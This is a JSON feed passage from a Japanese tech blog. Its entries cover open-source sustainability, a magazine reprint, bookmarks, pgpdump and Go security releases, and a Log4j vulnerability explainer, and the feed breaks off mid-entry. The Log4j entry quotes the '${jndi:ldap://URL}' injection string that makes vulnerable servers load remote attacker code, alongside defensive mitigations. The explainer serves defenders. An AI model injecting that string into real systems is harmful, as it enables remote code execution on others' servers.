{
  "title": "text.Baldanders.info",
  "url": "https://text.baldanders.info/",
  "feed": "https://text.baldanders.info/index.xml",
  "description": "帰ってきた「しっぽのさきっちょ」",
  "entry": [
    {
      "title": "オープンソースは砕けない",
      "section": "remark",
      "description": "タイトルは釣り",
      "author": "Spiegel",
      "license": "http://creativecommons.org/licenses/by-sa/4.0/",
      "url": "https://text.baldanders.info/remark/2021/12/open-source-is-unbreakable/",
      "published": "2021-12-14T12:59:02+00:00",
      "update": "2021-12-15T10:09:34+00:00",
      "content": "Log4j の対応に追われている現場エンジニアの皆様にお見舞い申し上げます。\nこういうことが起きると\n \u0026ldquo;Open Source\u0026rdquo; is Broken - Xe (日本語訳) \u0026ldquo;Open source\u0026rdquo; is not broken - nadh.in (日本語訳)  とか言い出す連中がいるわけで，ネタとしてはまぁまぁ面白いけど，食傷気味なところではある。 これらに対する反応としては Twitter TL で見かけた\n20年以上みんなずっと同じ話してるなと思ってしまうが、オープンソースが壊れている、壊れていないの話がやたらに流れている。この文脈ならフリーソフトウェアの時代からずっと壊れてるんだよ。それでも動いているのは自由だからだよ。\n\u0026mdash; Shuji Sado (佐渡 秀治) (@shujisado) December 14, 2021  あたりを強く支持する。\n自由には責任が伴う。 何故なら社会集団を構成する私達にとって自由とは自明のものではないから。 「個人の自由」は私たちの人類社会が長い時間をかけて「勝ち取った」ものであり，近代の夢で，ネットが社会と接続した現代でもそれは同じである。\nでも「フリーソフトウェア」をわざわざ「オープンソース・ソフトウェア」と言い直したのにはちゃんと意味があると思う。\nソフトウェアを自由に公開する意図は様々だ。 「それがぼくには楽しかったから」で産業構造をひっくり返す製品を送り出した人もいる。 また，何らかの社会的使命のもとに製品を作り続けている人もいるかもしれない。 あるいは私のように「独占する価値もないから」オープンソース・ライセンスを付けて公衆に放り出してるだけの人もいるだろう。\nオープンソースの功績・貢献をお金に換えることについては昔から議論があるが，上述したようにオープンソースで括れるプレイヤーは本当に多様で，もちろん商業的な成功例はあるが，一般化できないように思える。\nそもそも「オープンソースの功績・貢献をお金に換える」というのは問いの立て方として正しいのだろうか。\nいま話題の log4j とか脆弱性発生時点でスポンサーが３人しかいなかったと騒がれている。\nAs of yesterday, there were a grand total of three sponsors for this person’s work. via “Open Source” is Broken  GnuPG の作者である Werner Koch さんは一時期，経済的に困窮して GnuPG プロジェクトを放棄しようと考えていたことがあるそうな1。 Linux Kernel なんてイレギュラー中のイレギュラーで，あんな奇跡は二度と起こらないと断言しておこう。 一時期はデジタル補完通貨2 と FinTech で皆ウハウハみたいな話もあったけど，あれって本当に儲かってるのは miner と山師だけでしょ（笑）\nこの業界に入るきっかけになった会社では色々なことを叩き込まれたが，その中のひとつに「仕事は終わらせるもの」というのがある。 どんな仕事にも終わりがあるし，真っ当に終わらせることで「次」に進むことができる。\n離陸したならちゃんと着陸しないとね。 まぁ，エンジニアと違って経営者は着陸した先を考えるものだけど（笑）\n一方で個人の趣味や興味で作ったものに対して，その趣味や興味が他所に移ったとして，そのことで批判を受ける義理はないよね。 でもそういったものでも社会的な影響力を持つと「やーめた！」で終わらせることが難しくなる。\n私はオープンソース・プロジェクトの問題のひとつは「終わらせる」ことが難しいことにあるんじゃないかと思っている。\n今の GitHub はアーカイブ機能でリポジトリを凍結させられる。 この機能によってプロジェクトを明示的に「終わらせる」ことができる。 これは結構重要な機能だと思う。\n個人で無限の責任を負うことはできない。 それがたとえ自由の代償であってもだ。 責任を有限にするには「境界」を設定しなければならない。 それは時間軸についても同じ。 興味本位で始めたことであっても，死ぬまで同じプロジェクトに囚われるとか嫌過ぎる（笑）\n参考図書   リナックスの革命 ― ハッカー倫理とネット社会の精神 ペッカ ヒマネン (著), リーナス トーバルズ (著), マニュエル カステル (著), 安原 和見 (翻訳), 山形 浩生 (翻訳) 河出書房新社 2001-05-26 単行本 4309242456 (ASIN), 9784309242453 (EAN), 4309242456 (ISBN) 評価\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;  大昔に買ったんだけどうろ覚え。買い直そうかと思ったが邦訳は Kindle ではないのか。それにしても「リナックスの革命」とかいう頭の悪いタイトルはどうにかならなかったのだろうか。副題だけで十分ぢゃん。\nreviewed by Spiegel on 2020-12-12 (powered by PA-APIv5)\n   もうすぐ絶滅するという開かれたウェブについて 続・情報共有の未来 yomoyomo (著) 達人出版会 2017-12-25 (Release 2019-03-02) デジタル書籍 infoshare2 (tatsu-zine.com) 評価\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;  WirelessWire News 連載の書籍化。感想はこちら。祝 Kindle 化！\nreviewed by Spiegel on 2018-12-31\n   いかにして問題をとくか G. ポリア (著), Polya,G. (原著), 賢信, 柿内 (翻訳) 丸善 1975-04-01 単行本 4621045938 (ASIN), 9784621045930 (EAN), 4621045938 (ISBN) 評価\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;  数学書。というか問いの立てかたやものの考え方についての指南書。のようなものかな。\nreviewed by Spiegel on 2014-09-26 (powered by PA-APIv5)\n   ジョジョの奇妙な冒険 ダイヤモンドは砕けない 小野友樹 (出演), 梶裕貴 (出演), 高木渉 (出演), 櫻井孝宏 (出演), 小野大輔 (出演), 津田尚克 (監督), ジョジョの奇妙な冒険DU製作委員会 (プロデュース)  (Release 2016-04-04) Prime Video B01DSV9KDU (ASIN)  実は見ていない（笑）\nreviewed by Spiegel on 2021-12-14 (powered by PA-APIv5)\n   GnuPG は現在も寄付を受け付けている。\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n 暗号通貨とか暗号資産とか言ってやらん（笑）\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   "
    },
    {
      "title": "『bit』誌の電子復刻と TechMag",
      "section": "remark",
      "description": "個人的には「雑誌一覧」にある『Interface』誌の20世紀のバックナンバーを是非電子復刻して欲しい。",
      "author": "Spiegel",
      "license": "http://creativecommons.org/licenses/by-sa/4.0/",
      "url": "https://text.baldanders.info/remark/2021/12/more-bits/",
      "published": "2021-12-12T05:28:05+00:00",
      "update": "2021-12-12T05:28:51+00:00",
      "content": "私が最初に見かけたのは『プログラミング言語Go』や『Effective Java』の翻訳者である柴田芳樹さんの\n私が大学生になった1978年4月の月刊誌「bit」。情報工学科の学生にとっては、重要な雑誌でした。https://t.co/17tAVfjNfG\n\u0026mdash; Yoshiki Shibata/柴田芳樹 (@yoshiki_shibata) December 2, 2021  という tweet で「へー。デジタル版が出たのか」と軽く考えていたのだが，その後 yomoyomo さんの\n 技術雑誌をデジタル化して復刻するプロジェクトを応援したい - YAMDAS現更新履歴  という記事を見て「どっひゃー」となってしまった。 なにそれすごい！\nさらにさらに，この『bit』誌の目次情報を Scrapbox でデータベース化された方もいる。\n 共立出版 コンピュータサイエンス誌『bit』  なにそれすごい（本日二回目）\nというわけで，試しに創刊号を購入してみた。\n  【電子復刻版】bit 1969年03月号(通巻1号) 電子復刻版bit(月刊誌全巻) (【電子復刻版bit】) 石田晴久 (編集), 竹内郁雄 (編集) 共立出版 1969-03-01 (Release 2021-12-01) Kindle版 B09MLLYTQD (ASIN)  TechMag の成果。あの『bit』誌が電子復刻された！\nreviewed by Spiegel on 2021-12-12 (powered by PA-APIv5)\n ありがたいことに Kindle Cloud Reader で読める。\n よーし，うむうむ，よーし。\n実は私，コンピュータやソフトウェアの勉強を真面目に始めたのはこの業界に入ってからでして，右も左も分からず1 まるで「田舎から出てきたおのぼりさん」状態の私にとって『bit』誌はちょっと敷居が高い雑誌だったのよ（当時所属していた企業では『bit』誌を定期購読してたので，バックナンバーを含めていつでも見ることはできた）。\nというわけで『bit』誌が休刊になった際も yomoyomo さんの記事にあるように「まーそんなもんだろねー」という感じだった。 ゼロ年代は「波の最先端」が紙の雑誌よりも先にネットに集まり始めた時代で，特定のテーマでまとまっている書籍やムック本はまだしも，雑誌はどうしても「後追い」な印象が拭えず，優先順位が低くなっていったのは確かである。\nとはいえ TechMag の\n  1960年代から2000年にかけて、日本の半導体やコンピュータ技術は飛躍的に進歩し、技術雑誌がそれに貢献しました。　デジタル化して絶版をなくし、誰もの手に届く所に置き、後世に伝えることが、本プロジェクトの目的です。  技術雑誌｜電子復刻｜TechMagより  には深く共感する。 情報は，特にデジタル情報は意識して維持しようとしない限り簡単に失われてしまう。 今の時点で「それ」が必要かどうかに関係なく，維持することにリソースを割くのは意味があると私は思う。\n個人的には「雑誌一覧」にある『Interface』誌の20世紀のバックナンバーを是非電子復刻して欲しい。 この雑誌は物知らずの新人だった私にも優しい雑誌でホンマにお世話になったのよ。\n是非よろしくお願いします 🙇\n参考図書   プログラミング言語Go アラン・ドノバン (著), ブライアン・カーニハン (著), 柴田芳樹 (著) 丸善出版 2016-06-20 (Release 2021-07-13) Kindle版 B099928SJD (ASIN) 評価\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;  Kindle 版出た！ 一部内容が古びてしまったが，この本は Go 言語の教科書と言ってもいいだろう。感想はこちら。\nreviewed by Spiegel on 2021-05-22 (powered by PA-APIv5)\n   Effective Java 第3版 Joshua Bloch (著), 柴田 芳樹 (翻訳) 丸善出版 2018-10-30 単行本（ソフトカバー） 4621303252 (ASIN), 9784621303252 (EAN), 4621303252 (ISBN) 評価\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;  再勉強中。 Kindle 版のほうがちょっと安いが，勤務先でも使いたかったので紙の本にした。\nreviewed by Spiegel on 2021-03-17 (powered by PA-APIv5)\n   そもそも私はプログラミングがお金になることを業界に入るまで知らなかった（笑）\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   "
    },
    {
      "title": "2021-12-12 のブックマーク",
      "section": "bookmarks",
      "description": "「IPアドレスの例示で xxx.xxx.xxx.xxx を使うな」他",
      "author": "Spiegel",
      "license": "http://creativecommons.org/licenses/by-sa/4.0/",
      "url": "https://text.baldanders.info/bookmarks/2021/12/12-bookmarks/",
      "published": "2021-12-12T03:22:44+00:00",
      "update": "2021-12-13T11:50:35+00:00",
      "content": "リリース情報  Release November 2021 · microsoft/vscode · GitHub : Ubuntu だと日本語変換周りがおかしい Release v1.2021.16 · plantuml/plantuml · GitHub Release v0.90.0 · gohugoio/hugo · GitHub Release 8.13.5: Merge pull request #2542 from mermaid-js/2541 · mermaid-js/mermaid · GitHub 「Visual Studio Code」2021年11月更新でテーマカラーをインストールせずに体験可能に - 窓の杜  新しいセキュリティ技術「RLBox」で武装した「Firefox 95」が正式リリース - 窓の杜   Release 4.4.11_0 · nyaosorg/nyagos · GitHub Release v0.90.1 · gohugoio/hugo · GitHub Firefox 95.0, See All New Features, Updates and Fixes Thunderbird — Release Notes (91.4.0) — Thunderbird LibreOffice 7.2.4 Community and LibreOffice 7.1.8 Community available ahead of schedule to provide an important security fix - The Document Foundation Blog  セキュリティ＆プライバシー関連  EMailClients/Thunderbird - GnuPG wiki : Thunderbird で GnuPG を使う際の tips GitHub上のsensitive dataを削除するための手順と道のり | メルカリエンジニアリング 9つの主要なWi-Fiルータで、合計226の潜在的な脆弱性が発見 | TECH+  数百万台が流通するWi-Fiルーター9機種に計226の脆弱性 - PC Watch   Germany’s new government will firmly defend encryption, key Social Democrat says – EURACTIV.com  New German Government is Pro-Encryption and Anti-Backdoors - Schneier on Security   A mysterious threat actor is running hundreds of malicious Tor relays - The Record by Recorded Future  Someone Is Running Lots of Tor Relays - Schneier on Security   米国がウィキリークス創設者アサンジ氏の身柄引き渡しを求める訴えで勝訴 | TechCrunch Japan Windows 10 RCE: The exploit is in the link | Positive Security  Windows 10/11でリンクを踏むときは注意 ～URIハンドラーの不備にセキュリティ会社が警鐘 - 窓の杜   シスコ、Apache HTTP Serverの既知の脆弱性に関するアドバイザリ公開 | TECH+  「Apache HTTP Server」に複数の脆弱性、アップデートが公開 | Think IT（シンクイット）   「起きたら全て消えていた」　Discordで横行する“サーバー凍結荒らし”、1万人参加サーバーが一夜で消えたその手口（1/3 ページ） - ねとらぼ  知財関連  トヨタ、ホンダ、GMを訴えた「米特許管理会社」とは？（栗原潔） - 個人 - Yahoo!ニュース DRMを利用して「オープンソース」ブラウザを支配下におさめるGoogle | P2Pとかその辺のお話R  Linux または Ubuntu に関する話題  Ubuntu 20.04 その232 - Ubuntu 20.04.4 LTSのリリーススケジュール変更・2週間後ろへ - kledgeb Ubuntu 21.04 その57 - Ubuntu 21.04のサポート終了日のお知らせ・Ubuntu 21.10へアップグレードを - kledgeb Ubuntu 22.04 その14 - initramfsのデフォルトの圧縮形式を再検討 - kledgeb  Azure や Windows に関する話題  Google AnthosがMicrosoft Azureに正式対応。これでGoogle、AWS、Azureを連携させたマルチクラウドでのKubernetesやCloud Runなどの統合運用などが可能に － Publickey 自動バキュームを最適化する - Azure Database for PostgreSQL - Single Server | Microsoft Docs  Go 言語関連  Property-Based Testing In Go - Earthly Blog 10 Reasons NOT to use Go for your next project - DEV Community : バカウケ How To Write Your Own Go Module Proxy | by Marko Milojevic | Better Programming [Go] gorpを使っていい感じにDBアクセスを分離したい - Qiita ebitenでのガベージコレクタ処理のライブラリ化 - Qiita Go 1.18 で追加される any は interface{} のエイリアス - Qiita Go の image/color パッケージの color.RGBA に透明度を正しく指定する＆過ちの共有 - Qiita [Go] 言語仕様書の「型と値の特性」を理解する Go 1.18 でやってくる Generics とは - Google スライド GitHub - klauspost/compress: Optimized Go Compression Packages  zstd package - github.com/klauspost/compress/zstd - pkg.go.dev やっぱりzstdのほうがよかった　GoでZIP内部のzstdを解凍 - Qiita    Java 言語関連  SLF4Jの仕組みと使用方法 - NDW SpringブートSLF4Jロギングの例  その他  Python Boot Camp に参加した - 電気ウナギ的○○ ASCII.jp：ネットワークに特化したIPUのMount Evansでシェア拡大を狙うインテル　インテル CPUロードマップ (1/3) : 「インフラ処理でCPUを使ったら負け」 技術雑誌をデジタル化して復刻するプロジェクトを応援したい - YAMDAS現更新履歴 ダニエル・カーネマン、キャス・サンスティーンらの最新作『NOISE　組織はなぜ判断を誤るのか？』が早くも出た……のだが - YAMDAS現更新履歴 【書き起こし】Scenario-Based Integration Testing Platform for Microservices – 森 健太【Merpay Tech Fest 2021】 | メルカリエンジニアリング  テスト時間を短くするための分散テスト実行 | メルカリエンジニアリング   50 years of eBooks 1971-2021 | Project Gutenberg  予想より長い歴史が！？ 世界初の電子書籍の公開から今月で「50周年」を迎える【やじうまWatch】 - INTERNET Watch   Pale Blue Dot | This is a shot playing with light coming thr… | Flickr ORT-Web Demo .NET | 無料。 クロスプラットフォーム。 オープン ソース。 : 日本語化 ゲームでよくある「NATタイプ」はどう判定しているの？ IPアドレスの例示で xxx.xxx.xxx.xxx を使うな - Qiita Improving GitHub code search | The GitHub Blog  GitHubがコード検索を強化。正規表現対応、プログラミング言語別、組織やリポジトリ、ファイルパスなど範囲指定、高速な結果表示 － Publickey   我田引水的な「関数プログラミングの入門」資料紹介 - あどけない話 Kubernetes 1.23が正式リリース。IPv4/v6デュアルスタック、水平PodオートスケーラーAPIv2が安定版、Kubelet CRI APIがベータ版になど － Publickey Google Forms APIがオープンベータに。プログラミングでGoogleフォームを作成、回答を取得可能 － Publickey GHCのIOマネージャの歴史と僕の苦悩 - あどけない話 Dart2.15リリースノート和訳要約 「wsl.exe \u0026ndash;install」コマンドでインストールされる「WSL」がストア版に - 窓の杜 ビットコイン「先物」ETFと何が違うのか？SEC、ビットコイン「現物」ETFは拒否 | TechCrunch Japan 「PHP 7.3」のサポートが終了 - 窓の杜 Go の image/color パッケージの color.RGBA に透明度を正しく指定する＆過ちの共有 - Qiita アマゾンで障害、多数のウェブサイトやアプリに影響 - ZDNet Japan （Android アプリ開発の）その書き方古いかも。/ Devfest Tokyo 2021 - Speaker Deck 共立出版 コンピュータサイエンス誌『bit』 : Scrapbox でデータベース化されている。凄い！  "
    },
    {
      "title": "pgpdump 0.34 がリリースされた",
      "section": "release",
      "description": "Windows 用バイナリを作るか悩み中...",
      "author": "Spiegel",
      "license": "http://creativecommons.org/licenses/by-sa/4.0/",
      "url": "https://text.baldanders.info/release/2021/12/pgpdump-v0.34-is-released/",
      "published": "2021-12-11T12:47:42+00:00",
      "update": "2021-12-11T12:51:08+00:00",
      "content": "本家 pgpdump の v0.34 がリリースされたようだ。\n変更点は以下の通り。\n0.34 2021/12/07 * Uploading modifications to support GnuPG-2.3.3 ECC curves, additional hash and algorithm names. https://github.com/kazu-yamamoto/pgpdump/pull/32 * Improved labels for Literal Data Packet fields. https://github.com/kazu-yamamoto/pgpdump/pull/29 * Indicate unknown sigtype value is displayed in hex. https://github.com/kazu-yamamoto/pgpdump/pull/27 * Fixing cross-building and avoiding infinite loop when invoking BZ2_bzDecompress. https://github.com/kazu-yamamoto/pgpdump/pull/25  via pgpdump/CHANGES  例によってソースコードのみの提供だが Linux 環境ならビルドは簡単である。\n$ ./configure ... $ make gcc -c -g -O2 -O -Wall pgpdump.c gcc -c -g -O2 -O -Wall types.c gcc -c -g -O2 -O -Wall tagfuncs.c gcc -c -g -O2 -O -Wall packet.c gcc -c -g -O2 -O -Wall subfunc.c gcc -c -g -O2 -O -Wall signature.c gcc -c -g -O2 -O -Wall keys.c gcc -c -g -O2 -O -Wall buffer.c gcc -c -g -O2 -O -Wall uatfunc.c gcc -g -O2 -O -Wall -o pgpdump pgpdump.o types.o tagfuncs.o packet.o subfunc.o signature.o keys.o buffer.o uatfunc.o -lbz2 -lz 作者の方は既に Haskell の人で pgpdump のメンテナンスは積極的には行っていないみたいだが pull request は歓迎のようだ。 拙作の gpgpdump は本家 pgpdump をリファレンス実装とみなして参考にさせてもらってるので，今回の GnuPG 2.3 系への対応はありがたい。\n前回のリリースは2018年で，このときはまだ Windows 環境だったのだが，今回はどうすっかなぁ。 まぁ，折角 Azure Virtual Desktop 環境を作ったんだし，そっちで MSYS2 環境を作るかな。\n参考図書   暗号化 プライバシーを救った反乱者たち スティーブン・レビー (著), 斉藤 隆央 (翻訳) 紀伊國屋書店 2002-02-16 単行本 4314009071 (ASIN), 9784314009072 (EAN), 4314009071 (ISBN) 評価\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;  20世紀末，暗号技術の世界で何があったのか。知りたかったらこちらを読むべし！\nreviewed by Spiegel on 2015-03-09 (powered by PA-APIv5)\n   暗号技術入門 第3版　秘密の国のアリス 結城 浩 (著) SBクリエイティブ 2015-08-25 (Release 2015-09-17) Kindle版 B015643CPE (ASIN) 評価\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;  SHA-3 や Bitcoin/Blockchain など新しい知見や技術要素を大幅追加。暗号技術を使うだけならこれ1冊でとりあえず無問題。\nreviewed by Spiegel on 2015-09-20 (powered by PA-APIv5)\n "
    },
    {
      "title": "Go 1.17.5 のリリース【セキュリティ・アップデート】",
      "section": "release",
      "description": "今回は2件の脆弱性修正を含んでいる。",
      "author": "Spiegel",
      "license": "http://creativecommons.org/licenses/by-sa/4.0/",
      "url": "https://text.baldanders.info/release/2021/12/go-1_17_5-is-released/",
      "published": "2021-12-11T09:20:44+00:00",
      "update": "2021-12-11T09:22:04+00:00",
      "content": "Go 1.17.5 がリリースされた。\n [security] Go 1.17.5 and Go 1.16.12 are released  今回は2件の脆弱性修正を含んでいる。\ngo1.17.5 (released 2021-12-09) includes security fixes to the syscall and net/http packages. See the Go 1.17.5 milestone on our issue tracker for details. via Release History - The Go Programming Language  CVE-2021-44716: net/http: limit growth of header canonicalization cache An attacker can cause unbounded memory growth in a Go server accepting HTTP/2 requests.\nFor users who cannot immediately update to the new release, setting the GODEBUG=http2server=0 environment variable before calling Serve will disable HTTP/2 unless it was manually configured through the golang.org/x/net/http2 package.\nThis issue is also fixed in golang.org/x/net/http2 v0.0.0-20211209124913-491a49abca63, for users manually configuring HTTP/2.\n via Go 1.17.5 and Go 1.16.12 are released  というわけで golang.org/x/net/http2 パッケージを使っている場合は，こちらも要アップデートだな。\n（以下未稿）\nCVE-2021-44717: syscall: don’t close fd 0 on ForkExec error When a Go program running on a Unix system is out of file descriptors and calls syscall.ForkExec (including indirectly by using the os/exec package), syscall.ForkExec can close file descriptor 0 as it fails. If this happens (or can be provoked) repeatedly, it can result in misdirected I/O such as writing network traffic intended for one connection to a different connection, or content intended for one file to a different one.\nFor users who cannot immediately update to the new release, the bug can be mitigated by raising the per-process file descriptor limit.\n via Go 1.17.5 and Go 1.16.12 are released  これはちょっとヤバいかな。\n（以下未稿）\n例によって\u0026hellip; Ubuntu の APT で管理している Go コンパイラは古いので，ダウンロードページからバイナリ（go1.17.5.linux-amd64.tar.gz）を取ってきてインストールすることを強く推奨する。 以下は完全手動での作業例。\n$ cd /usr/local/src $ sudo curl -L \u0026#34;https://go.dev/dl/go1.17.5.linux-amd64.tar.gz\u0026#34; -O $ cd .. $ sudo unlink go # 以前の Go が入っている場合 $ sudo tar xvf src/go1.17.5.linux-amd64.tar.gz $ sudo mv go go1.17.5 $ sudo ln -s go1.17.5 go $ go version # /usr/local/go/bin にパスが通っている場合 go version go1.17.5 linux/amd64 アップデートは計画的に。\n参考図書   プログラミング言語Go アラン・ドノバン (著), ブライアン・カーニハン (著), 柴田芳樹 (著) 丸善出版 2016-06-20 (Release 2021-07-13) Kindle版 B099928SJD (ASIN) 評価\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;  Kindle 版出た！ 一部内容が古びてしまったが，この本は Go 言語の教科書と言ってもいいだろう。感想はこちら。\nreviewed by Spiegel on 2021-05-22 (powered by PA-APIv5)\n "
    },
    {
      "title": "Java 製 Logger “Log4j” の脆弱性について",
      "section": "remark",
      "description": "Logback にも脆弱性（の可能性）あり。",
      "author": "Spiegel",
      "license": "http://creativecommons.org/licenses/by-sa/4.0/",
      "url": "https://text.baldanders.info/remark/2021/12/log4j-vulnerability/",
      "published": "2021-12-11T06:22:43+00:00",
      "update": "2021-12-18T06:19:56+00:00",
      "content": "私の Twitter TL では昨日あたりからちらほら見かけるようになったが Java 製の事実上の標準 logger である Apache Log4j に脆弱性があったそうで，最新版 2.15.0 のアナウンスが出ている。 ちょっと大事になりそうな気がするので，この記事で覚え書きとして残しておく。\nCVE-2021-44228 Apache Log4j2 \u0026lt;=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. via Log4j – Apache Log4j Security Vulnerabilities  ちょっと分かりにくいかもしれないので，以下の解説記事も参考にどうぞ。\n 今回問題となっているのはJndi Lookupだ。これはJavaのJava Naming and Directory Interfaceによる変数名の置換で、ネットワーク越しに変数に相当する値を検索することができる。その中にLDAPも含まれる。例えば\u0026quot;${jndi:ldap://someremoteclass}\u0026quot;のようになる。\n問題は、このURLに.を含めることにより、lg4jは任意のリモートのLDAPサーバーからjava classファイルをダウンロードして読み込んでしまうのだ。\nなので悪意あるjava classファイルとそれをホストするLDAPサーバーを用意して、ターゲットとなるJavaで動きlog4jを使っているプログラムに\u0026quot;${jndi:ldap://URL}\u0026quot;の形でログ出力されるようにすれば、任意のコード実行が可能になる。\n log4jの脆弱性についてより  ここまで言及されれば今回の脆弱性のヤバさが分かるだろう。 サービス側にログが吐かれるだけでこの脆弱性が発火する可能性があるのだ。 これは私達が目にしている各種サービスだけではなく，たとえばバックエンドで外部の Web API サービスを利用しているのならそちらも考慮する必要がある。 あるいは，もしかしたら組込み製品でアプリケーションを Java で組んでいるかもしれない。\nApache Log4j はこの脆弱性の CVSS 評価値を\n CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H 深刻度: 緊急 (Score: 10)     基本評価基準 評価値     攻撃元区分 ネットワーク   攻撃条件の複雑さ 低   必要な特権レベル 不要   ユーザ関与レベル 不要   スコープ 変更あり   機密性への影響 高   完全性への影響 高   可用性への影響 高    と見積もっている。\n一応，サービス側の緩和措置も示されているので「すぐに対応できないよー」という場合は参考にするといいだろう。\nIn releases \u0026gt;=2.10, this behavior can be mitigated by setting either the system property log4j2.formatMsgNoLookups or the environment variable LOG4J_FORMAT_MSG_NO_LOOKUPS to true. For releases from 2.0-beta9 to 2.10.0, the mitigation is to remove the JndiLookup class from the classpath: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class. via Log4j – Apache Log4j Security Vulnerabilities  とりあえずシステム・プロパティまたは環境変数で対応って感じかねぇ。\nアップデートは計画的に。\n【2021-12-15 追記】 CVE-2021-44228 リリースした 2.15.0 に不備があったため 2.16.0 がリリースされている。\nIt was found that the fix to address CVE-2021-44228 in Apache Log4j 2.15.0 was incomplete in certain non-default configurations. This could allows attackers with control over Thread Context Map (MDC) input data when the logging configuration uses a non-default Pattern Layout with either a Context Lookup (for example, $${ctx:loginId}) or a Thread Context Map pattern (%X, %mdc, or %MDC) to craft malicious input data using a JNDI Lookup pattern resulting in a denial of service (DOS) attack. Log4j 2.15.0 restricts JNDI LDAP lookups to localhost by default. Note that previous mitigations involving configuration such as to set the system property log4j2.noFormatMsgLookup to true do NOT mitigate this specific vulnerability. via Log4j – Apache Log4j Security Vulnerabilities  Apache Log4j はこの脆弱性の CVSS 評価値を\n CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H\n(CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L から大幅に引き上げた模様【2021-12-18 追記】) 深刻度: 緊急 (Score: 9)     基本評価基準 評価値     攻撃元区分 ネットワーク   攻撃条件の複雑さ 高   必要な特権レベル 不要   ユーザ関与レベル 不要   スコープ 変更あり   機密性への影響 高   完全性への影響 高   可用性への影響 高    と見積もっている。\n前節で示した緩和策は使えないらしい。 2.16.0 以降に上げられないのであれば\nOtherwise, remove the JndiLookup class from the classpath: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class via Log4j – Apache Log4j Security Vulnerabilities  と class ファイルを削除する必要がある。\n【2021-12-15 追記】 Logback にも脆弱性（の可能性）あり Logback バージョン 1.2.8 がリリースされている。 このバージョンでは LOGBACK-1591 に絡む対応が行われている。 ただし，これが脆弱性として発火するとしても以下の前提条件が必要となる。\n write access to logback.xml use of versions \u0026lt; 1.2.8 reloading of poisoned configuration data, which implies application restart or scan=\u0026quot;true\u0026quot; set prior to attack   via News  LOGBACK-1591 は現時点（2021-12-15）ではまだ確定的ではないが，予防措置として log4j と同じく JNDI lookup コードを削除することにしたようだ。\nブックマーク  GitHub - apache/logging-log4j2: Apache Log4j 2 is an upgrade to Log4j that provides significant improvements over its predecessor, Log4j 1.x, and provides many of the improvements available in Logback while fixing some inherent problems in Logback\u0026rsquo;s architecture. Remote code injection in Log4j · CVE-2021-44228 · GitHub Advisory Database · GitHub Oracle Security Alert Advisory - CVE-2021-44228 “Log4Shell” Java vulnerability – how to safeguard your servers – Naked Security Log4shell software flaw threatens millions of servers as hackers scramble to exploit it - ABC News Apache Log4j2 Security Bulletin (CVE-2021-44228) Cybereason/Logout4Shell: Use Log4Shell vulnerability to vaccinate a victim server against Log4Shell RCE in log4j, Log4Shell, or how things can get bad quickly Apache Log4j の脆弱性対策について(CVE-2021-44228)：IPA 独立行政法人 情報処理推進機構  Apache Log4jの任意のコード実行の脆弱性（CVE-2021-44228）に関する注意喚起   マイクラもハッキング ～「Apache Log4j」ライブラリに致命的なリモートコード実行のゼロデイ脆弱性【12月10日18:45追記】 - やじうまの杜 - 窓の杜  Minecraft では既に影響が出ている模様：\nCritical RCE exploit discovered on all Minecraft Java versions from 1.7 to 1.18, clients and servers. (Log4j2 2.0.0 - 2.14.1 vuln)\nFix it w:\n- Use -Dlog4j2.formatMsgNoLookups=true\n- Update Fabric Loader to 0.12.9\n- Upgrade Paper server to latest 1.18 - Wait for mojang patches\n\u0026mdash; Minecraft@Home (@minecraftathome) December 10, 2021    Worst Apache Log4j RCE Zero day Dropped on Internet - Cyber Kendra\n  Log4Shell: RCE 0-day exploit found in log4j2, a popular Java logging package | LunaSec : Steam や iCloud も対象なのか\n  Apache Log4j 2 CVE-2021-44228 - Docker Blog : “Docker Official Images” で今回の脆弱性の影響を受けるものがリストアップされている\n  Inside the Log4j2 vulnerability (CVE-2021-44228)\n  What you need to know about the Log4J vulnerability rocking the internet - F-Secure Blog\n  Microsoft’s Response to CVE-2021-44228 Apache Log4j 2 – Microsoft Security Response Center\n  Statement from CISA Director Easterly on “Log4j” Vulnerability | CISA\n  Log4jの深刻な脆弱性CVE-2021-44228についてまとめてみた - piyolog\n  「Docker Desktop」が「Log4j」問題に対応 ～脆弱性スキャンツールを更新 - 窓の杜\n  iCloud、ツイッター、マインクラフトなどに使われているオープンソースのログユーティリティにゼロデイ脆弱性が見つかる | TechCrunch Japan\n  広く使われているJavaライブラリ「Log4j」に深刻な脆弱性。速やかに確認と対策を － Publickey\n  【注意喚起】Log4jの脆弱性を狙う攻撃を多数検知、至急対策を！ | セキュリティ対策のラック\n  システムの重要な基盤「Log4j」の脆弱性が、世界中に“破壊的”な影響を及ぼしている | WIRED.jp\n  LOG4J2-3211 - Remove Messge Lookups (#623) · apache/logging-log4j2@2797204 · GitHub : 2.16.0 登場。メッセージ・ルックアップ機能をコードから削除した模様\n  Log4j 2のバージョンアップのやりかた - 日々常々\n  Log4J2 Vulnerability and Spring Boot\n  Log4jで話題になったWAFの回避/難読化とは何か - WAF Tech Blog ｜ クラウド型 WAFサービス Scutum 【スキュータム】\n  【重要】Apache Log4j ライブラリの脆弱性における当社サービスへの影響について | さくらインターネット\n  世界中を揺るがしたJavaライブラリの脆弱性・Log4Shellのネタ画像をまとめた「log4j memes」 - 